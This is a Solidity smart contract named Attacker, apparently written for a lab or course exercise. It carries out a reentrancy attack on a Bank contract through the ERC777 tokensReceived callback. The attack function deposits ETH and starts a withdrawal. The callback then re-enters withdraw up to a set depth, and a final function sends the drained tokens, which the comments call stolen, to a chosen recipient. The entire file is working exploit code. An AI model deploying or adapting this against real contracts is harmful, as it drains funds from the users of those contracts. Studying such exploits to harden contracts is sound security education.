// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "./Bank.sol";

contract Attacker is AccessControl, IERC777Recipient {
    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
	IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24); // Location of the EIP1820 registry
	bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient"); // ERC777TokensRecipient interface hash
	uint8 private depth = 0;
	uint8 private max_depth = 2;

	Bank public bank; 

	event Deposit(uint256 amount);
	event Recurse(uint8 depth);

    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(ATTACKER_ROLE, admin);
		_erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this)); // Register with the EIP1820 Registry
    }

	// Set the target bank to attack
	function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
		bank = Bank(bank_address);
        _grantRole(ATTACKER_ROLE, address(this));
        _grantRole(ATTACKER_ROLE, address(bank.token()));
	}

	/*
	   The main attack function that starts the reentrancy attack.
	   amt is the amount of ETH the attacker will deposit initially to start the attack.
	*/
	function attack(uint256 amt) payable public onlyRole(ATTACKER_ROLE) {
		require(address(bank) != address(0), "Target bank not set");

		// Deposit ETH to start the attack
		bank.deposit{value: amt}();
		emit Deposit(amt);

		// Start withdrawing, which will trigger tokensReceived callback
		bank.withdraw(amt);
	}

	/*
	   After the attack, this contract has a lot of (stolen) MCITR tokens.
	   This function sends those tokens to the target recipient.
	*/
	function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
		ERC777 token = bank.token();
		token.send(recipient, token.balanceOf(address(this)), "");
	}

	/*
	   This is the function that gets called when the Bank contract sends MCITR tokens.
	   It recursively calls withdraw to continue the reentrancy attack until max_depth is reached.
	*/
	function tokensReceived(
		address operator,
		address from,
		address to,
		uint256 amount,
		bytes calldata userData,
		bytes calldata operatorData
	) external {
		require(msg.sender == address(bank.token()), "Unexpected token");
		require(to == address(this), "Tokens must be sent to this contract");

		if (depth < max_depth) {
			depth++;
			emit Recurse(depth);

			// Recurse to withdraw more tokens, exploiting the reentrancy vulnerability
			bank.withdraw(amount);
		}
	}
}
